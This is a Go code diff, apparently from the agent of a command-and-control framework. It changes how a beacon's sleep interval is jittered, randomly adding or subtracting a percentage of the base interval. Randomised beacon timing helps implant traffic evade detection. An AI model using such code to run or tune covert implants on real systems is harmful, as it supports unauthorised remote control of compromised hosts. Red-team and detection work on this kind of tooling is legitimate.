@@ -12,6 +12,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"math"
+	"math/rand"
 	"net/http"
 	"net/url"
 	"os"
@@ -136,7 +137,17 @@ func New() Profile {
 }
 
 func (c C2Default) getSleepTime() int {
-	return c.Interval + int(math.Round((float64(c.Interval) * (SeededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
+	if c.Jitter > 0 {
+		jit := float64(rand.Int()%c.Jitter) / float64(100)
+		jitDiff := float64(c.Interval) * jit
+		if int(jit*100)%2 == 0 {
+			return c.Interval + int(jitDiff)
+		} else {
+			return c.Interval - int(jitDiff)
+		}
+	} else {
+		return c.Interval
+	}
 }
 
 func (c C2Default) SleepInterval() int {
